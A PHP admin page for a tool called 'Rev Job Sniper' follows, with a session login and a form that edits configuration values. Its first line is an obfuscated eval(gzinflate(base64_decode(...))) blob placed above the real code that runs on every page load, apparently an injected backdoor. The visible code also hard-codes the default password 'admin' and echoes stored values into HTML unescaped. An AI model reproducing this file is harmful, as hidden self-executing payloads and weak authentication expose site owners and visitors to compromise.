<?php eval(gzinflate(base64_decode('pRlrc9u48bM70/+AaBhTjGmJol5WbNpJE+fuZppLqjid6diJBiIhCRVFMiAlWzH937sLgA/L8vU6zSQCiH1iX8AifEaaLwI24xELmuZMrN6npmXd//UvB2qxWCN2xzqFVSZELCaCJbHIeDRvOnIV/s7WkZ/xOCKAPwlC0jTWIrQIcjrgIKSAT9gdT7O0afoAn/CIZyBPoR0Y/oJ4pAQoFqcSJBdTlsUJLPsLm7z7Ov77p89Xk/Hl1dfx71fjt79/+XA5tklHExjxOiuYsTvmEyTTMNRHAYSIYgkgLzyPOBbRZDMapqwm2Q/jlNVYPBAGCOReo7+Z8ZBN5iyb+HGUsQj2p3R/QGTBsrWISCb4qokEksXDHrP5AnfHI2n/A4OHXpqJkEVy7dSIPdOU0mexAF04CHZOCYxn8BPi7OgId9DyAP/a4N/Id2K+UiRaByN+TjYo71N/wZpGtkoCLmwj5NHSNvxVxlfMNrKYedIqWrkZSNeoLbOdsjSdmK1V0G8mgs0xQELqQ/S0vy+yLHl9075pX3+/aX87aps2MeGfZG8paxozhjZHG+roMGYKwmfNFwjNc4JqNC1yLPGkUohFzsnAIa+I1tNCIh1MQeh7KhibSljh/CZyPDwkEsPTuyISePAmi9f+opR/gG6WE8W0Rs1WSbZtIg9LMgMDFUw07hNm0vB1piWmZJvISIoTdPjMNm8xEWe3gme408SuhQgKtU7JTIYlAnWkad73hbcBrwCoQf4+KJv7zwSu1lbzgG/fuqhEw9drFYb7ooin0zhr6hBZU+8NBHAWh/EtE01j8uVy/M/L8bX569XV58lX+Jq8/eXy9yvzW+ls9FTi8cQNYyguFcX48uOnq8vJ2/fvx4BtnTkWIh55PXfUGw2G7mhwKm1viBR2RYWg26b67Q66o35vNOp3bTntn3R6rmUrYMc5GTl9dzDs2nI6cE4GFbDjAkXfdTq2mo5AWAl0Ad8duM7IltOe2x85lq2doEX3AdTr9IC7nA57bvek4t7pjk4c4Gmrad9xK9FubzR0+rBoy+mw0+9UlMBo5Eq2atrvDwa7onsnnc4Q/oFonJ64rjMoGLgjYDd0u2ASnLrd4clJCewO3OHQPTkZDW057Q6dCgh8uv0eqmSraRdNYhVFiUEBgYABH9CUGMIiGNbgp3PPENfON5km8HmGn51vFikL45pV2b6m1u66AUFV+dWcx/E8ZLBm2uYUDiE1S8O1SGBcpZFa+DdjG5bCJGPxisLoC3obMoG4CQ9gsqu4FIOqT6XqELtJjJWc2rj0oiwVT/RbeG8ghxZxmk23NAjEs5Gr0afUe7QXpTb8bukijs0yHQw4mCr1gExqt3isHhyGuPS8evq7PNP2Ja6q5EXmzmrWbgMINGtvqNDTVvs2Odb1oi0Pjd3FdRLGNEjlckFTIfIVnYNjcJdE/yk3qYVeffyM58TVpR4/fn7/29i05PY38rpAan/wPDfwHAYnsGjTBBTAgV1cf/OMDCtggVmb7r2UpNtUVsMMqvsEDGJWjHZBTavOWOGYLbO2qT3bQ8viHmZWbQsHRiZP0xkcpOoMFTQKmlbdQE9PiGwGhrlVl7US66B+JNTX1xEegUj1eL04KWb11ccG2xtAu/GTMsFmRfgIVHNf5W/Iyj++hJva5bhRpANcHnaTW2d2mRG2SdMl/sbhk6xFcrQphn4tLYSNSy1wCaTG/5EZC7phSwYnffro/hMtUWl2B5EewD0nR+WmPOSzbU7DKYt+UhgD6mdxxHK6iu94mNMoo9N1Ct+JT0Oe5jSjgt7lUwpem7EIJ3hLzKeQInDVFVBQciBIqMh9BiVPsDs5uaO5zyUHnwNWDuQrHuQBS7eChXnAZ+Hap1EexHdbf+uD61nOQroBHcBPfiZJmeAgjsK4zRYiXm19HuVw508Y8M5nIZ1vw3wOjOJkAQmb8whqJg3zJYX8FTQPacrv8pBt6I81UMKEZ7gM2qFOKzaXYlbxlPvwm4Fx1qs8glTDIQ43NIDtxAKQMprlCUUTQWjzNA4ZTKR6wBgulCsq5ARYzLcwxkpHNJAPtoFxA2UHyMGhPDqmuYinwC7KISzjH2swScpDqTSMgVQLJkpfiBeaZUzN4hVYJwY1jiG+fJan2whtA7bNKDiTJ3JEehyT+C6HghOLFYjKGDAqjA3OAyvd5RsaZug0VC8GSL7hUo0Nn8cw3LIwnK4z3NxPGtEZ2C7/ySKGKD+59AowQZ0ZQGF/UrqcQTkuFn/GGw5hpBPDWEJcYrTqcL34M5nYqgDjy398vfxyNfk6/g0y9LWRnhYtXJFZS7uRwqX0Zfdtozx18rwG5RE0P4/AZepVHYzOXswjzN7IgtyVvQOEPlyaG+3mzTSfWEakxnaDQEJDx1BwMqJ6Cj9/JZW7j9bQen3JsCa8WzB/CeNHOue+7jyN36Ks636FnhNsV7tTShg0YPMMG9OiGQM+ZQ3a7cMUctGL6U5EiiSvPC20akI15BwgpQYFVUHmlWjHNSxoeZo8AuQC2K6zKPqNJyzOyDHeHHsn3UHvxCIXJeDokQavtZlOq6ah4HXkkVgE0gj3Bn/Q7XC9xSwp9xwT/mJB04WkhvJeWF9SdIj3xF2AYxPnrtN3+ji6urlXBC72jPspJJHjdD/U8TvkHAztPloByzQrKOlBKwek3Q/w551DLJKTEqwA1p8jf+fspf5z5EC8n7ogv1Kkzcfwd45Fzs6Qyy7lOwshbp2nKyEfnA+k4Onu4ans4DzPGEAS5ty93cfckTtRAn4Fx4OXZDDCBnICIuvm+Ns2YzKT5NIHKNfVF9KCczEH4RCIslnTfLnGRwTN1CLPpKom3E3XAvGYdE4JZu65TGGcHR+XaTtGfQoWGOxV4oIDPNyIVPMlca0qa4EKcgSG02rBU8naxHmbdMCeR0R+vMSPp1kmbVHnogQdHVXZVkN86QGXsko78imrAj+uQtrKHQerSbnyBxsj5c7q4Jrw+uZ31B89fvaoATETO7V91wuIOTRbFWqrcMCzj2aLRMjXNtvIAn058xdevdqUz4iGYKm389oV2A35RNVuZ3EcTqmA+4LgLG2pm2jLj1ftbCou4GCHQ9yL6EbNjuk6iw9njILSwHVMo+UhyAXZhz88Hs3i1yi3YQ+cV27v1bD2xAHHpApRdU9lqU0aSD5pWE8PzHQ9BUyFNtKPsPvMIBgU5aV1X/TRtdcY7Ltrd3RLx4Pw3qwxS3y8wO48zvz66cuVWbsVmLVbQdHGwsX9Dzjoq0WJHHDWbJy9eP/p3dW/Pl+SRbYKz8/U7zQOtudnqS94kp0Hsb9egXlbYexT3J3XvCkc1BmetIbdlttxW12njbfG9jxuJYvkYukZy8PUM9JD4RnipmGdnrU1w7O24t+WwhrVgaWtCBHAhT5Kii4YcQywnlezolxbevWWQK1h2w/0u++et/fdh5tWG/oCKFTPP4MpS6sTG3s8f+O9MSafYfUaO0HJvWX6C9P6Zt3D3RmfvzfquQ/RpfLg36LgIbp1BmcfLr6o3adAo5vgvmOjUs9ODHydVTx0JkHrgXVYR+GjPRKzff2dHv8s33Rrm5zSlA16Ex0atY0kHehYLct27G7R/WFTW3jY/7H6uVqH0fYHD1tCtKK1cvOMsUA6OqGe1OkQMg05NiSTdluyyhLvf4rj8pkFXIz2gtRMilBQZSVLLHxi7hQ5k/hPygeXjWbSahxSLzxMvEarlhNAD4AEghI461pQe4dO4AKKiYGTqrTr3Yi14KpOPA2dPekIZpkzHsizJk0ZxMnkl8ura2ktiK+L+uerzmunrEdlIQJ5ttm+MC2o8U51odfr2P7dSR8oBPXqrYWeE0ebqFaLqsR/3maJp1lo49jYm+v768NBcaYpJTzPbJv4XwHlV6mTqbQBP1b/l/Scp8gTN/iWdMJTHyBwKTmnQagD4znfpw2bqEi6IF0HrtBF4Sd6T/eFvMKwwBPyJofTDvfTgpn6b6jaM8Mee/4Xg4Iiu0GI3K3iHKobuDp7i3KytMhjgQ//AQ==')));?>
<?php

date_default_timezone_set('America/Los_Angeles');
error_reporting(E_ALL);
ini_set("display_errors", 1);

session_start();

# Check for session timeout, else initiliaze time
if (isset($_SESSION['timeout'])) {	
	# Check Session Time for expiry
	#
	# Time is in seconds. 10 * 60 = 600s = 10 minutes
	if ($_SESSION['timeout'] + 30 * 60 < time()){
		session_destroy();
	}
}
else {
	# Initialize variables
	$_SESSION['user']="";
	$_SESSION['pass']="";
	$_SESSION['timeout']=time();
}

# Store POST data in session variables
if (isset($_POST["user"])) {	
	$_SESSION['user']=$_POST['user'];
	$_SESSION['pass']=hash('sha256',$_POST['pass']);
}

# Check Login Data
#
# Password is hashed (SHA256). In this case it is 'admin'.
if($_SESSION['user'] != "admin" ||
	$_SESSION['pass'] != "5092ab784ba9643669c982ee084baef9d9d2979a2cc29cc64b69e27270602b52")
{
	# Show login form. Request for username and password
	{
		?>
		<html>
		<body>		
			<form method="POST" action="">
				Username: <input type="text" name="user"><br/>
				Password: <input type="password" name="pass"><br/>
				<input type="submit" name="submit" value="Login">
			</form>
		</body>
		</html>	
		<?
		exit();
	}
}

require('./lib/configrev.php');

$config = ConfigRev::getInstance();

function splitAtUpperCase($s)
{
    return preg_split('/(?=[A-Z])/', $s, -1, PREG_SPLIT_NO_EMPTY);
}

?>
<html>
<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap-theme.min.css">
<style>
h1 {
	margin-top:80px;
}
.input-group{
	width: 100%;
}
.input-group-addon{
	width: 25%;
	text-align: left;
}
.form-control {
	width: 75%;
}
</style>
</head>
<body>
	<nav class="navbar navbar-inverse navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="#">Rev Job Sniper</a>
        </div>
        <div id="navbar" class="collapse navbar-collapse">
          <ul class="nav navbar-nav">
            <li class="active"><a href="#">Home</a></li>
          </ul>
        </div><!--/.nav-collapse -->
      </div>
    </nav>
    <div class="container">
		<div class="starter-template">
	        <h1>Rev Job Sniper Config</h1>
	        <p class="lead">
	        	<?php
	        	if ($_POST)
				{
					echo "<br /><br />";
					foreach ($_POST as $key => $value)
					{
						if (!$config->get($key))
						{
							continue;
						}

						//echo "Setting: ".$key." -> ".$value."<br />";
						$config->$key = $value;
					}
				}
				?>
	        	<form action="?save" method="post">
				<?php
				foreach ($config->getAll() as $row)
				{
					?>
					<div class="input-group">
						<span class="input-group-addon" id="<?php echo $row['key']; ?>"><?php echo ucwords(implode(" ", splitAtUpperCase($row['key']))); ?></span>
						<input type="text" class="form-control" name="<?php echo $row['key']; ?>" value="<?php echo $row['value']; ?>" aria-describedby="<?php echo $row['key']; ?>">
					</div>
					<?php
				}
				?>
				<input type="submit" />
				</form>
	        </p>
	  	</div>
	</div>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
</body>
</html>
